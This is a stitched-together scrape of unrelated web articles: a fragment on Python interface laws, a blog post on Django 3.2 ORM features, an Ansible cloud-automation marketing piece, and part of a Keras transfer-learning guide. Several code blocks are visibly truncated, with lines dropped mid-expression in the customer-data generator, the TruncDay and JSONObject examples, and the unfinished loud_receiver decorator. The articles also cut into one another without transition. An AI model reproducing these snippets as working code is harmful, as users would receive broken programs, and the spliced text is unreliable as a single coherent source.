  <li>Transitivity law: if <code>a</code> equals <code>b</code> and <code>b</code> equals <code>c</code>, then <code>a</code> equals <code>c</code></li>
</ul>

<p>We can create a test that will ensure that our implementation holds these laws. Or we might forget about it. Or make a mistake in our test logic.</p>

<p>That’s why it is important for library authors to think about their users and ship tests with their apps.</p>

<p>For example, we encode laws into the interface definition itself:</p>

<div><div><pre><code><span>from</span> <span>abc</span> <span>import</span> <span>abstractmethod</span>
<span>from</span> <span>typing</span> <span>import</span> <span>ClassVar</span><span>,</span> <span>Sequence</span><span>,</span> <span>TypeVar</span>

<span>from</span> <span>typing…</span></code></pre></div></div></div></div>

<p>Django 3.2 is just around the corner and it's <a href="https://docs.djangoproject.com/en/dev/releases/3.2/" rel="noopener">packed with new features</a>. Django versions are usually not that exciting (it's a good thing!), but this time many features were added to the ORM, so I find it especially interesting!</p>
<p><strong>This is a list of my favorite features in Django 3.2</strong></p>
<figure>
<figcaption>Image from the Django welcome page</figcaption>
</figure>
<p>A lot of great people worked on this release and none of them is me. I included links to the tickets of each new feature to show my appreciation to the people behind it.</p>
<details open="">
    <summary>Table of Contents</summary>

<hr>
<details markdown="1">
<summary>⚙ Setup local environment with the latest version of Django</summary>
<p>To setup an environment with the latest version of Django start by creating a new directory and a virtual environment:</p>
<div><pre><span></span><span>$</span> mkdir django32
<span>$</span> <span>cd</span> django32
<span>$</span> python3.9 -m venv venv
<span>$</span> <span>source</span> venv/bin/activate
</pre></div>


<p>To install the latest version of Django you can either install using <code>pip</code>, or if it hasn't been released yet, install directly from git:</p>
<div><pre><span></span><span>(venv) $</span> pip install git+https://github.com/django/django@3.2a1
</pre></div>


<p>Start a new project and app:</p>
<div><pre><span></span><span>(venv) $</span> django-admin startproject project
<span>(venv) $</span> ./manage.py startapp store
</pre></div>


<p>Add the new app to the list of <code>INSTALLED_APPS</code>, and configure a PostgreSQL database:</p>
<div><pre><span></span><span># settings.py</span>

<span>INSTALLED_APPS</span> <span>=</span> <span>[</span>
    <span># ...</span>
    <span>'store'</span><span>,</span>
<span>]</span>

<span>DATABASES</span> <span>=</span> <span>{</span>
    <span>'default'</span><span>:</span> <span>{</span>
        <span>'ENGINE'</span><span>:</span> <span>'django.db.backends.postgresql'</span><span>,</span>
        <span>'NAME'</span><span>:</span> <span>'django32'</span><span>,</span>
        <span>'USER'</span><span>:</span> <span>'postgres'</span><span>,</span>
    <span>}</span>
<span>}</span>
</pre></div>


<p>To try out some of the new features, create a <code>Customer</code> model:</p>
<div><pre><span></span><span># store/models.py</span>
<span>import</span> <span>datetime</span>

<span>from</span> <span>django.db</span> <span>import</span> <span>models</span>

<span>class</span> <span>Customer</span><span>(</span><span>models</span><span>.</span><span>Model</span><span>):</span>
    <span>joined_at</span><span>:</span> <span>datetime</span><span>.</span><span>datetime</span> <span>=</span> <span>models</span><span>.</span><span>DateTimeField</span><span>()</span>
    <span>name</span><span>:</span> <span>str</span> <span>=</span> <span>models</span><span>.</span><span>CharField</span><span>(</span><span>max_length</span><span>=</span><span>1000</span><span>)</span>
</pre></div>


<p>Finally, create the DB, generate and apply the migrations:</p>
<div><pre><span></span><span>(venv) $</span> createdb django32 -O postrges
<span>(venv) $</span> ./manage.py makemigrations
<span>(venv) $</span> ./manage.py migrate
</pre></div>


<p>Great! Now add some random customer data:</p>
<div><pre><span></span><span>import</span> <span>string</span>
<span>import</span> <span>datetime</span>
<span>import</span> <span>random</span>
<span>import</span> <span>pytz</span>

<span>)</span> <span>for</span> <span>__</span> <span>in</span> <span>range</span><span>(</span><span>10</span><span>_000</span><span>)))</span>
</pre></div>


<p>Congratulations! You now have 10K new customers, you are ready to go!</p>

<h2 id="covering-indexes"><a href="#covering-indexes">Covering Indexes</a></h2>
<p><a href="https://code.djangoproject.com/ticket/30913" rel="noopener">Ticket #30913</a></p>
<p>Covering indexes let you store additional columns in an index. The main benefit of a covering index is that when a query only uses fields that are present in the index, the <a href="https://www.postgresql.org/docs/current/indexes-index-only-scans.html" rel="noopener">database can use an index-only scan</a>, meaning the actual table is not accessed at all. This can make queries faster.</p>
<p>Django 3.2 added support for PostgreSQL covering indexes:</p>
<blockquote>
<p>The new Index.include and UniqueConstraint.include attributes allow creating covering indexes and covering unique constraints on PostgreSQL 11+.</p>
</blockquote>
<p>If for example you are searching for names of customers that have joined during a certain period of time, you can create an index on <code>joined_at</code>, and include the field <code>name</code> in the index:</p>
<div><pre><span></span><span>class</span> <span>Customer</span><span>(</span><span>models</span><span>.</span><span>Model</span><span>):</span>
    <span>class</span> <span>Meta</span><span>:</span>
        <span>indexes</span> <span>=</span> <span>(</span>
            <span>models</span><span>.</span><span>Index</span><span>(</span>
                <span>name</span><span>=</span><span>'</span><span>%(app_label)s</span><span>_</span><span>%(class)s</span><span>_joined_at_ix'</span><span>,</span>
<span>                <span>fields</span><span>=</span><span>(</span><span>'joined_at'</span><span>,),</span>
</span><span>                <span>include</span><span>=</span><span>(</span><span>'name'</span><span>,),</span>
</span>            <span>),</span>
        <span>)</span>
</pre></div>


<p>The <code>include</code> arguments makes this a covering index.</p>
<p>For queries that only use the fields <code>joined_at</code> and <code>name</code>, the database will be able to satisfy queries using just the index:</p>
<div><pre><span></span><span>&gt;&gt;&gt; </span><span>print</span><span>(</span>
<span>... </span>  <span>Customer</span><span>.</span><span>objects</span>
<span>... </span>  <span>.</span><span>filter</span><span>(</span><span>joined_at__lt</span><span>=</span><span>pytz</span><span>.</span><span>UTC</span><span>.</span><span>localize</span><span>(</span><span>datetime</span><span>.</span><span>datetime</span><span>(</span><span>2021</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)))</span>
<span>... </span>  <span>.</span><span>values_list</span><span>(</span><span>'name'</span><span>)</span>
<span>... </span>  <span>.</span><span>explain</span><span>()</span>
<span>... </span><span>)</span>

<span><span>Index Only Scan using store_customer_joined_at_ix on store_customer</span>
</span><span>  Index Cond: (joined_at &lt; '2021-02-01 00:00:00+00'::timestamp with time zone)</span>
</pre></div>


<p>The query above finds names of customers that joined before February 2021. According to the execution plan, the database was able to satisfy the query using just the index, without even accessing the table. This is called an "index only scan".</p>
<p>Index only scans can be a bit confusing at first. As described in the <a href="https://www.postgresql.org/docs/current/indexes-index-only-scans.html" rel="noopener">official documentation of PostgreSQL</a>, it might take some time before PostgreSQL can actually use <em>just</em> the index:</p>
<blockquote>
<p>But there is an additional requirement for any table scan in PostgreSQL: it must verify that each retrieved row be “visible” to the query's MVCC snapshot [...]. Visibility information is not stored in index entries, only in heap entries; so at first glance it would seem that every row retrieval would require a heap access anyway.</p>
</blockquote>
<p>Another way to check if a table page can be viewed by the current transaction is to check the table's visibility map, which is significantly smaller and faster to access than the table itself. It may take some time for PostgreSQL to update the visibility map, so until then you might see an execution plan like this one:</p>
<div><pre><span></span><span>Bitmap</span> <span>Heap</span> <span>Scan</span> <span>on</span> <span>store_customer</span>  <span>(</span><span>cost</span><span>=</span><span>27.07..117.02</span> <span>rows</span><span>=</span><span>876</span> <span>width</span><span>=</span><span>16</span><span>)</span>
  <span>Recheck</span> <span>Cond</span><span>:</span> <span>(</span><span>joined_at</span> <span>&lt;</span> <span>'2021-02-01 00:00:00+00'</span><span>::</span><span>timestamp</span> <span>with time zone</span><span>)</span>
  <span>-&gt;</span>  <span>Bitmap</span> <span>Index</span> <span>Scan</span> <span>on</span> <span>store_customer_joined_at_ix</span>  <span>(</span><span>cost</span><span>=</span><span>0.00..26.86</span> <span>rows</span><span>=</span><span>876</span> <span>width</span><span>=</span><span>0</span><span>)</span>
        <span>Index</span> <span>Cond</span><span>:</span> <span>(</span><span>joined_at</span> <span>&lt;</span> <span>'2021-02-01 00:00:00+00'</span><span>::</span><span>timestamp</span> <span>with time zone</span><span>)</span>
</pre></div>


<p>To check if your index can really be used for index only scans, you can speed up the process by manually issuing <a href="https://www.postgresql.org/docs/current/sql-vacuum.html" rel="noopener">vacuum analyze</a> on the table:</p>
<div><pre><span></span><span>VACUUM</span> <span>ANALYZE</span> <span>store_customer</span><span>;</span>
</pre></div>


<p>Executing <code>VACUUM</code> will also <a href="https://hakibenita.com/postgresql-unused-index-size#index-and-table-bloat">reclaim some unused space</a> and make it available for re-use.</p>
<p><em>UPDATE 2020-03-04</em>: I originally suggested using <code>VACUUM FULL</code> instead of plain <code>VACUUM</code>. <a href="https://twitter.com/Adrien_nayrat/status/1367153917239427078?s=20" rel="noopener">A commenter on twitter</a> mentioned that using <code>VACUUM</code> will be sufficient for this purpose, and will be much less intrusive and disruptive, so use that instead!</p>
<p>It is also important to keep in mind that inclusive indexes are not free. Additional fields in the index will make the index bigger.</p>

<h2 id="provide-timezone-to-truncdate"><a href="#provide-timezone-to-truncdate">Provide Timezone to TruncDate</a></h2>
<p><a href="https://code.djangoproject.com/ticket/31948" rel="noopener">Ticket #31948</a></p>
<p>I write a lot about <a href="https://hakibenita.com/sql-dos-and-donts">mistakes in SQL</a> and timezones are usually at the top of the list. One of the most dangerous mistakes when working with timestamps is <a href="https://hakibenita.com/sql-dos-and-donts#be-aware-of-timezones">truncating without explicitly specifying a timezone</a>, which can lead to incorrect and inconsistent results.</p>
<p>In Django 3.2 it becomes easier to avoid this mistake:</p>
<blockquote>
<p>The new tzinfo parameter of the TruncDate and TruncTime database functions allows truncating datetimes in a specific timezone.</p>
</blockquote>
<p>In previous Django versions, the timezone was set internally according to the current timezone:</p>
<div><pre><span></span><span># django/db/models/functions/datetime.py</span>
<span>tzname</span> <span>=</span> <span>timezone</span><span>.</span><span>get_current_timezone_name</span><span>()</span> <span>if</span> <span>settings</span><span>.</span><span>USE_TZ</span> <span>else</span> <span>None</span>
</pre></div>


<p>As of Django 3.2, you can explicitly provide a timezone to the <a href="https://docs.djangoproject.com/en/dev/ref/models/database-functions/#django.db.models.functions.TruncDate" rel="noopener"><code>TruncDate</code></a> functions family:</p>
<div><pre><span></span><span>import</span> <span>pytz</span>
<span>from</span> <span>django.db.models.functions</span> <span>import</span> <span>TruncDay</span>

<span>Customer</span><span>.</span><span>objects</span>

</span><span>.</span><span>values</span><span>(</span><span>'joined_at_day'</span><span>)</span>

<span># SELECT DATE_TRUNC('day', "store_customer"."joined_at" AT TIME ZONE 'UTC') AS "joined_at_day"</span>
<span># FROM "store_customer"</span>

<span>Customer</span><span>.</span><span>objects</span>
<span><span>.</span><span>annotate</span><span>(</span><span>joined_at_day</span><span>=</span><span>TruncDay</span><span>(</span><span>'joined_at'</span><span>,</span> <span>tzinfo</span><span>=</span><span>pytz</span><span>.</span><span>timezone</span><span>(</span><span>'America/New_York'</span><span>)))</span>
</span><span>.</span><span>values</span><span>(</span><span>'joined_at_day'</span><span>)</span>

<span># SELECT DATE_TRUNC(</span>
<span>#     'day',</span>
<span>#     "store_customer"."joined_at" AT TIME ZONE 'America/New_York'</span>
<span># ) AS "joined_at_day"</span>
<span># FROM "store_customer"</span>
</pre></div>


<p>A step in the right direction!</p>

<h2 id="building-json-objects"><a href="#building-json-objects">Building JSON Objects</a></h2>
<p><a href="https://code.djangoproject.com/ticket/32179" rel="noopener">Ticket #32179</a></p>
<p>Building JSON objects in PostgreSQL is very handy, especially if you are working with unstructured data.</p>
<p>As of Django 3.2, the function <a href="https://www.postgresql.org/docs/current/functions-json.html#FUNCTIONS-JSON-CREATION-TABLE" rel="noopener"><code>json_build_object</code> from PostgreSQL</a> that accepts arbitrary key-value pairs was added to the ORM:</p>
<blockquote>
<p>Added the JSONObject database function.</p>
</blockquote>
<p>One interesting use case is serializing objects directly in the DB, bypassing the need to create ORM objects:</p>
<div><pre><span></span><span>&gt;&gt;&gt;</span> <span>from</span> <span>django.db.models</span> <span>import</span> <span>F</span>
<span>&gt;&gt;&gt;</span> <span>from</span> <span>django.db.models.functions</span> <span>import</span> <span>JSONObject</span>

<span>},)</span>
</pre></div>


<p>We already showed how crucial <a href="https://hakibenita.com/django-rest-framework-slow">serialization performance</a> can be, so this is something to consider.</p>
<hr>
<h2 id="loud-signal-receiver"><a href="#loud-signal-receiver">Loud Signal Receiver</a></h2>
<p><a href="https://code.djangoproject.com/ticket/32261" rel="noopener">Ticket #32261</a></p>
<p>A while back I <a href="https://twitter.com/be_haki/status/1335921247306264579?s=20" rel="noopener">twitted about a mysterious bug</a> I had that went unnoticed for a long time because it happened inside a signal receiver.</p>
<p>When you use <code>send_robust</code> to broadcast signals, if the signal fails, Django keeps the error and moves on to the next receiver. After all of the receivers processed the signal, Django returns a list with the receivers' return values and exceptions. To check if any of the receivers failed, you need to go over the list and check for instances of <code>Exception</code>. Signals are often used to decouple modules, and handing exceptions from receivers this way defeats that purpose.</p>
<p>To make sure I don't miss exceptions in signal receivers again, I created a "loud signal receiver" that logs exceptions:</p>
<div><pre><span></span><span>from</span> <span>django.dispatch</span> <span>import</span> <span>receiver</span>

<span>def</span> <span>loud_receiver</span><span>(</span><span>signal</span><span>,</span> <span>logger</span><span>,</span> <span>**</span><span>kwargs</span><span>):</span>
    <span>"""Subscribe to Django signal and log errors from the receiver function.</span>

<span>    When using `send_robust` to send Django Signals, errors happening in the</span>
<span>    receivers are kept and returned. Because signals are mostly used for decoupling</span>
<span>    modules, the return value from `send_robust` is often dismissed.</span>
<span>    To make it easier not to miss errors from Django signal receivers, use this decorator</span>
<span>    instead to log the exceptions to a specific logger.</span>

<span>    NOTE: Not necessary as of Django 3.2</span>

<span>    Example:</span>
<span>        logger = logging.getLogger('some.logger')</span>
<span>        @loud_receiver(signals.SomeSignal, logger=logger, dispatch_uid='uid')</span>
<span>        def receiver_func():</span>
<span>            pass</span>
<span>    """</span>
    <span>def</span> <span>_decorator</span><span>(</span><span>func</span><span>):</span>
        <span>def</span> <span>loud_func</span><span>(</span><span>*</span><span>func_args</span><span>,</span> <span>**</span><span>func_kwargs</span><span>):</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>Cloud provisioning is a critical element of the modern cloud computing model.
We live in the age of microservices, where <a href="https://steampunk.si/blog/the-benefits-of-it-automation-and-why-you-should-start-using-it-now/" title="Post about automation benefits">automation</a> is not a
nice-to-have anymore. It became an integral part of everyday operations.</p>
<p>Luckily, there is a wide variety of <a href="https://steampunk.si/blog/introduction-to-configuration-management-tools/" title="Introduction to configuration management">automation and orchestration
tools</a> out there. Those tools can save us time while simultaneously
increasing the performance and accuracy of provisioning and configuration
management processes.</p>
<p>In this article, we will explore the benefits of <strong>cloud automation with
Ansible</strong>.  We will discuss several use cases that illustrate the power this
tool presents in the areas of provisioning, configuration, and compliance.</p>
<h2 id="ansibles-role-in-cloud-automation">Ansible’s role in cloud automation</h2>
<p>Ansible is, first and foremost, an automation tool. Given the right content
(roles, modules, and other plugins), Ansible can automate almost anything. And
cloud management is no exception, which means that we can automate our
provisioning processes with relative ease.</p>
<p>With a little help from continuous integration and continuous deployment
(CI/CD) products, Ansible can transform into a mighty orchestration tool. We
can start combining standalone tasks into complex workflows that automate
complex IT processes.</p>
<p>And if we bind workflow executions to events from our monitoring systems, we
made some serious steps towards self-healing infrastructure.</p>
<p>But none of the previously described things are possible if we do not have
<strong>Ansible integration for the cloud provider</strong> of our choice.</p>
<h2 id="why-should-cloud-providers-have-ansible-integrations">Why should cloud providers have Ansible integrations?</h2>
<p>The traditional model for many businesses is to have infrastructure
provisioning processes separated from the configuration management workflows.
And while configuration management is often (at least partially) automated, it
is not uncommon for system administrators to manage infrastructure manually,
which is slow, laborious, and error-prone.</p>
<p>By provisioning cloud infrastructure with Ansible, system administrators can
perform day one and day two operations using a modern and reliable tool. And
the Ansible playbooks used to manage cloud resources also serve as
human-readable and machine-executable documentation.</p>
<p>Many users already use Ansible for their non-infrastructure automation needs.
Having a high-quality Ansible integration offers a seamless transition for such
users, unifying their management tools.</p>
<p><strong>Providing Ansible integration as a cloud provider will raise the confidence
and improve cloud customers’ user experience.</strong></p>
<h2 id="benefits-of-using-ansible-for-cloud-automation">Benefits of using Ansible for cloud automation</h2>
<p>Ansible is not the only tool that we can use to manage cloud resources. But
because of its simplicity and flexibility, it does offer quite a few advantages
compared to similar utilities.</p>
<p><strong>No need for a separate configuration management tool.</strong>Â&nbsp;Ansible is so
powerful, we can provision cloud resources, configure the operating system, and
then install and configure the application on top. We can do this using a
single Ansible playbook if we wish. Chaining together multiple Ansible
playbooks is a more flexible alternative.</p>
<p><strong>Less vendor lock-in.</strong>Â&nbsp;Ansible modules serve as a thin abstraction layer over
the cloud provider’s application programming interface (API). Abstraction gives
the freedom and flexibility to switch between different cloud providers at any
time with minimal effort. And it enables us to work with multiple clouds
simultaneously without risking the cloud-specific tools overload.</p>
<p><strong>User-friendly automation layer.</strong>Â&nbsp;Ansible playbooks are YAML files that
describe the desired state of the system we want to manage. Writing Ansible
playbooks requires no prior development or programming experience. And there
are plenty of online resources to help us with the Ansible playbook authoring
process.</p>
<h2 id="ansible-use-cases-for-cloud">Ansible use cases for cloudÂ&nbsp;</h2>
<p>As already stated before, we can use Ansible to manage almost anything. But in
this section, we will look at three different cloud-related use cases that
benefit significantly from Ansible’s involvement.</p>
<h3 id="creating-new-cloud-resources">Creating new cloud resources</h3>
<p>Creating a new virtual machine does not sound too complicated. We need to click
a few buttons, and that is it. Right? Well, in reality, things are never this
simple. Because before we create a new virtual machine, we may need to create a
virtual private cloud that will host our resources. And set up a security group
(think firewall). And create an internet gateway. And make sure we have our SSH
keys ready. The list goes on and on.</p>
<p>We can describe all those steps in a reusable Ansible playbook once and then
run them as many times as needed. We can also parameterize our Ansible
playbook. Parameterization allows us to modify the deployment process without
having to edit the Ansible playbook. And with a little help from Ansible Tower,
we can package our parameterized Ansible playbook into a self-service catalog
item anyone can use.</p>
<h3 id="managing-existing-cloud-resources">Managing existing cloud resources</h3>
<p>Ansible can use a cloud provider as a source of information about existing
resources. This dynamic approach makes manual inventory management a thing of
the past. We can now manage hundreds of servers without breaking a sweat.</p>
<p>Combining dynamic inventory with Ansible’s ability to execute operations in
batches, we get a potent tool for performing rolling updates of clusters.</p>
<h3 id="ensuring-compliance">Ensuring compliance</h3>
<p>If we follow the best practices when authoring our Ansible playbooks, we will
produce a concise description of the desired state. We already know that
Ansible will, when executing the instructions, robustly enforce this state on
the managed node.</p>
<p>But we can reuse the same description to detect unauthorized or unintentional
configuration changes, commonly referred to as configuration drift. Running
Ansible in check mode will produce a list of deviations from the desired state.
For example, we can detect changes to security group rules.</p>

<p>Although we focused our attention on the cloud today, we looked at it through
the eyes of an Ansible user. For example, we talked about the desired state of
resources and change detection, which are the two most fundamental things
Ansible users expect from Ansible integration.</p>
<p>Cloud providers often only think about the cloud functionality they offer when
setting up an Ansible integration. Typically, this leads to poorly-designed
Ansible content that feels out of place when used in Ansible playbooks.</p>
<p>Creating a high-quality Ansible integration is far more than just wrapping an
existing cloud API. Ensuring modules have a public API that follows Ansible’s
best practices, setting up a robust test suite, and properly documenting the
content are just a few things each high-quality Ansible Collection needs.</p>
<p>By <a href="https://steampunk.si/blog/should-you-build-or-outsource-the-development-of-ansible-collections/" title="Article with pros and cons of outsourcing Ansible Collection development">outsourcing the development of Ansible Collections</a> to experts,
cloud providers get a high-quality Ansible integration while allowing them to
focus their efforts on their primary product.</p>
<h2 id="wrap-up">Wrap Up</h2>
<p>Ansible is probably the only widely-used automation tool that <strong>allows us to
describe the whole deployment uniformly</strong>: from the provisioning phase to the
holistic configuration of the applications that run on top of the cloud
resources.</p>
<p>Ansible Collections play a central role in Ansible’s flexibility. They provide,
among other things, integrations with cloud providers that unlock
cloud-management capabilities. If appropriately designed, Ansible Collections
significantly improve user experience and remove barriers to adoption, bringing
benefits to both customers and cloud providers.</p>

customer story, and get inspired by downloading our free <a href="https://steampunk.si/ebooks/importance-of-high-quality-ansible-collections/" title="E-book about importance of high-quality Ansible Collections">e-book</a>.</p>

<p>It can take weeks to train a neural network on large datasets. Luckily, this time can be shortened thanks to model weights from pre-trained models – in other words, applying <strong>transfer learning</strong>.</p>



<p><a href="https://machinelearningmastery.com/transfer-learning-for-deep-learning/" target="_blank" rel="noreferrer noopener nofollow">Transfer learning </a>is a technique that works in image classification tasks and natural language processing tasks. In this article, you’ll dive into:</p>


<div>
<ul><li>what transfer learning is,</li><li>how to implement transfer learning (in Keras),</li><li>transfer learning for image classification,</li><li>transfer learning for natural language processing</li></ul>
</div>


<p>Well then, let’s start learning! (no pun intended… ok, maybe a little)&nbsp;</p>





<h2 id="transfer-learning-overview">What is transfer learning?</h2>



<p><a href="https://towardsdatascience.com/transfer-learning-from-pre-trained-models-f2393f124751" target="_blank" rel="noreferrer noopener nofollow">Transfer learning is about leveraging feature representations from a pre-trained model</a>, so you don’t have to train a new model from scratch.&nbsp;</p>



<p>The pre-trained models are usually trained on massive datasets that are a standard benchmark in the computer vision frontier. The weights obtained from the models can be reused in other computer vision tasks.&nbsp;</p>



<p>These models can be used directly in making predictions on new tasks or integrated into the process of training a new model. Including the pre-trained models in a new model leads to lower training time and lower generalization error.&nbsp;&nbsp;</p>



<p>Transfer learning is particularly very useful when you have a small training dataset. In this case, you can, for example, use the weights from the pre-trained models to <strong>initialize the weights</strong> of the new model. As you will see later, transfer learning can also be applied to natural language processing problems.&nbsp;</p>



<div><figure><img data-attachment-id="40779" data-permalink="https://neptune.ai/blog/transfer-learning-guide-examples-for-images-and-text-in-keras/transfer-learning-idea" data-orig-file="https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?fit=1366%2C768&amp;ssl=1" data-orig-size="1366,768" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Transfer-learning-idea" data-image-description="" data-medium-file="https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?fit=1024%2C576&amp;ssl=1" loading="lazy" src="https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?resize=768%2C432&amp;ssl=1" alt="Transfer learning idea" width="768" height="432" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?resize=128%2C72&amp;ssl=1 128w, https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?resize=21%2C12&amp;ssl=1 21w, https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?resize=71%2C40&amp;ssl=1 71w, https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?resize=50%2C28&amp;ssl=1 50w, https://i0.wp.com/neptune.ai/wp-content/uploads/Transfer-learning-idea.jpg?w=1366&amp;ssl=1 1366w" sizes="(max-width: 768px) 100vw, 768px" data-recalc-dims="1"><figcaption><em>The idea of transfer learning</em></figcaption></figure></div>



<p>The advantage of pre-trained models is that they are generic enough for use in other real-world applications. For example:</p>


<div>
<ul><li><strong>models trained on the ImageNet</strong> can be used in real-world image classification problems. This is because the dataset contains over 1000 classes. Let’s say you are an insect researcher. You can use these models and fine-tune them to classify insects.&nbsp;</li><li><strong>classifying text requires knowledge of word representations</strong> in some vector space. You can train vector representations yourself. The challenge here is that you might not have enough data to train the embeddings. Furthermore, training will take a long time. In this case, you can use a pre-trained word embedding like GloVe to hasten your development process.&nbsp;&nbsp;</li></ul>
</div>


<p>You will explore these use cases in a moment.</p>



<h3>What is the difference between transfer learning and fine-tuning?</h3>



<p><strong>Fine-tuning </strong>is an optional step in transfer learning. <a href="https://www.researchgate.net/post/What-is-the-difference-between-Transfer-Learning-vs-Fine-Tuning-vs-Learning-from-scratch" target="_blank" rel="noreferrer noopener nofollow">Fine-tuning will usually improve the performance</a> of the model. However, since you have to retrain the entire model, you’ll likely overfit.&nbsp;</p>







<p>Overfitting is avoidable. Just retrain the model or part of it using a <strong>low learning rate</strong>. This is important because it prevents significant updates to the gradient. These updates result in poor performance. Using a callback to stop the training process when the model has stopped improving is also helpful.&nbsp;</p>



<h3>Why use transfer learning?</h3>



<p>Assuming you have 100 images of cats and 100 dogs and want to build a model to classify the images. How would you train a model using this small dataset? You can train your model from scratch, but it will most likely overfit horribly. Enter transfer learning. Generally speaking, there are two big reasons why you want to use transfer learning:</p>


<div>
<ul><li><strong>training models with high accuracy requires a lot of data</strong>. For example, the ImageNet dataset contains over 1 million images. In the real world, you are unlikely to have such a large dataset.&nbsp;</li><li>assuming that you had that kind of dataset, you might still <strong>not have the resources required to train a model </strong>on such a large dataset. Hence transfer learning makes a lot of sense if you don’t have the compute resources needed to train models on huge datasets.&nbsp;</li><li>even if you had the compute resources at your disposal, you still have to<strong> wait for days or weeks to train such a model</strong>. Therefore using a pre-trained model will save you precious time.&nbsp;</li></ul>
</div>


<h3>When does transfer learning not work?</h3>



<p>Transfer learning will not work when the high-level features learned by the bottom layers are not sufficient to differentiate the classes in your problem. For example, a pre-trained model may be very good at identifying a door but not whether a door is closed or open. In this case, you can use the low-level features (of the pre-trained network) instead of the high-level features. In this case, you will have to retrain more layers of the model or use features from earlier layers.&nbsp;</p>



<p>When datasets are not similar, features transfer poorly. This <a href="https://arxiv.org/pdf/1411.1792.pdf" target="_blank" rel="noreferrer noopener nofollow">paper</a> investigates the similarity of datasets in more detail. That said, as shown in the paper, initializing the network with pre-trained weights results in better performance than using random weights.&nbsp;</p>



<p>You might find yourself in a situation where you consider the removal of some layers from the pre-trained model. Transfer learning is unlikely to work in such an event. This is because removing layers reduces the number of trainable parameters, which can result in overfitting.&nbsp; Furthermore, determining the correct number of layers to remove without overfitting is a cumbersome and time-consuming process.&nbsp;</p>







<h2 id="transfer-learning-implement">How to implement transfer learning?</h2>



<p>Let’s now take a moment and look at how you can implement transfer learning.&nbsp;</p>



<h3>Transfer learning in 6 steps</h3>



<p>You can implement transfer learning in these six general steps.&nbsp;</p>

<p>The first step is to get the <a href="https://keras.io/api/applications/" target="_blank" rel="noreferrer noopener nofollow">pre-trained model</a> that you would like to use for your problem. The various sources of pre-trained models are covered in a separate section.&nbsp;</p>



<h4>Create a base model</h4>



<p>Usually, the first step is to instantiate the <strong>base mode</strong>l using one of the architectures such as ResNet or Xception. You can also optionally download the <strong>pre-trained weights</strong>. If you don’t download the weights, you will have to use the architecture to train your model from scratch. Recall that the base model will usually have more units in the final output layer than you require. When creating the base model, you, therefore, have to remove the final output layer. Later on, you will add a final output layer that is compatible with your problem.&nbsp;</p>

<h4>Freeze layers so they don’t change during training</h4>



<p>Freezing the layers from the pre-trained model is vital. This is because you don’t want the <strong>weights in those layers to be re-initialized</strong>. If they are, then you will lose all the learning that has already taken place. This will be no different from training the model from scratch.&nbsp;</p>



<pre>base_model.trainable = <span>False</span></pre>







<h4>Add new trainable layers&nbsp;</h4>



<p>The next step is to <strong>add new trainable layers</strong> that will turn old features into predictions on the new dataset. This is important because the pre-trained model is loaded without the final output layer.&nbsp;</p>







<h4>Train the new layers on the dataset</h4>



<p>Remember that the pre-trained model’s final output will most likely be different from the output that you want for your model. For example, pre-trained models trained on the ImageNet dataset will output 1000 classes. However, your model might just have two classes. In this case, you have to train the model with a new output layer in place.&nbsp;</p>



<p>Therefore, you will add some new dense layers as you please, but most importantly, a final dense layer with <strong>units corresponding to the number of outputs expected by your model</strong>.&nbsp;</p>



<h4>Improve the model via fine-tuning</h4>



<p>Once you have done the previous step, you will have a model that can make predictions on your dataset. Optionally, you can improve its <strong>performance through fine-tuning</strong>. Fine-tuning is done by unfreezing the base model or part of it and training the entire model again on the whole dataset at a very low learning rate. The low learning rate will increase the performance of the model on the new dataset while preventing overfitting.&nbsp;</p>



<p>The learning rate has to be low because the model is quite large while the dataset is small. This is a recipe for overfitting, hence the low learning rate. Recompile the model once you have made these changes so that they can take effect. This is because the behavior of a model is frozen whenever you call the compile function. That means that you have to call the compile function again whenever you want to change the model’s behavior. The next step will be to train the model again while monitoring it via callbacks to ensure it does not overfit.&nbsp;</p>







<p>Pretty straightforward, eh?</p>



<h3>Where to find pre-trained models?</h3>



<p>Let’s now talk about where you can find pre-trained models to use in your applications.&nbsp;</p>



<h4>Keras pre-trained models</h4>



<p>There are more than two dozen pre-trained models available from Keras. They’re served via <a href="https://keras.io/api/applications/" target="_blank" rel="noreferrer noopener nofollow"><strong>Keras applications</strong></a><strong>.</strong> You get pre-trained weights alongside each model. When you download a model, the weights are downloaded automatically. They will be stored in `~/.keras/models/.` All the Keras applications are used for image tasks. For instance, here is how you can initialize the MobileNet architecture trained on ImageNet.&nbsp;</p>



<pre>model = tf.keras.applications.MobileNet(
    input_shape=<span>None</span>,
    alpha=<span>1.0</span>,
    depth_multiplier=<span>1</span>,
    dropout=<span>0.001</span>,
    include_top=<span>True</span>,
    weights=<span>"imagenet"</span>,
    input_tensor=<span>None</span>,
    pooling=<span>None</span>,
    classes=<span>1000</span>,
    classifier_activation=<span>"softmax"</span>,
)</pre>



<h4>Transfer learning using TensorFlow Hub</h4>



